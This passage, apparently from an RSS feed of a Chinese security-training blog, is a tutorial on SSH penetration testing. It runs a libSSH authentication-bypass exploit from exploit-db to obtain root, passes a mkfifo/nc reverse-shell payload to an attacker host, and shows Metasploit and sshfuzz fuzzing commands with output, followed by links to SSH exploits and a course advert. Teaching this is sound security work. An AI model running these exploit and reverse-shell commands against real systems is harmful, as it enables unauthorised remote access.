libSSH - Authentication Bypass                                                              | exploits/linux/remote/45638.py
-------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因此，我们可以使用漏洞利用程序在目标上执行命令，确认其是否正常运行。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 id
uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;尝试反向 shell，先打开监听&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo ncat -nlp 80&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后，在漏洞利用中使用 payload：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 &amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.100 80 &amp;gt;/tmp/f&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;模糊测试&lt;/h2&gt;&lt;p&gt;这里介绍两种：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通用&amp;amp;自动化&lt;/li&gt;&lt;li&gt;特定&amp;amp;手工&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;通用&amp;amp;自动化&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可以使用 sshfuzz.pl 之类的脚本来自动对 SSH 服务器实时进行模糊测试。&lt;/p&gt;&lt;p&gt;优点是操作简单，但是它的针对性不强，因此将花费大量时间并且错过很多结果。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ cpan Net::SSH2
$ ./sshfuzz.pl -H 192.168.1.94 -P 22 -u noraj -p noraj&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另一种适用于任何 SSH 服务器的自动化检测工具，是使用 metasploit 的模块 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;auxiliary/fuzzers/ssh/ssh_version_2&lt;/a&gt;：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 &amp;gt; use auxiliary/fuzzers/ssh/ssh_version_2
msf5 auxiliary(fuzzers/ssh/ssh_version_2) &amp;gt; set RHOSTS 192.168.1.94
msf5 auxiliary(fuzzers/ssh/ssh_version_2) &amp;gt; run
[*] Running module against 192.168.1.94

[*] 192.168.1.94:22 - Fuzzing with iteration 100 using fuzzer_string_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 200 using fuzzer_string_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 300 using fuzzer_string_long
[*] 192.168.1.94:22 - Fuzzing with iteration 400 using fuzzer_string_long
[*] 192.168.1.94:22 - Fuzzing with iteration 500 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 600 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 700 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 800 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 900 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 1000 using fuzzer_string_paths_giant
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这些工具使用起来很容易，但是找到可利用的机会很小。&lt;/p&gt;&lt;p&gt;&lt;b&gt;特定&amp;amp;手动&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果想找到漏洞或可利用的点，可以选择手动方法。需要尝试构建字典，深入理解 SSH 协议及其实现等等。&lt;/p&gt;&lt;h2&gt;相关工具和资源&lt;/h2&gt;&lt;p&gt;&lt;b&gt;HASSH&lt;/b&gt;&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/salesforce/hassh&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/salesforce/h&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;assh&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;一种网络指纹识别标准，可用于标识特定的客户端和服务器SSH实现。指纹可以以 MD5 指纹的形式轻松存储、搜索和共享。&lt;/blockquote&gt;&lt;p&gt;HASSH 是一项标准，可帮助蓝队检测，控制和调查爆破或凭据填充、密码尝试、数据泄露、网络发现和横向移动等。ssh-audit 是 SSH 服务器审核工具。&lt;/p&gt;&lt;p&gt;对于渗透测试人员来说，快速检测目标版本并了解远程服务器上可用的算法，再向客户提供算法建议。&lt;/p&gt;&lt;p&gt;&lt;b&gt;远程 SSH 漏洞&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Sysax 5.53-SSH&amp;#39;Username&amp;#39;远程缓冲区溢出（Metasploit）：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/18557&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/18557&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;OpenSSH &amp;lt;6.6 SFTP-命令执行：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/45001&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/45001&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;OpenSSH 2.3 &amp;lt;7.7-用户名枚举：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/45233&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/45233&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;OpenSSH SCP客户端-写入任意文件：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/46516&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/46516&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;源自 TURGENSEC &lt;b&gt;noraj&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;更多有关内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn%255C.zhihu.com/../&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-06-101260538</guid>
<pubDate>Mon, 06 Jan 2020 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
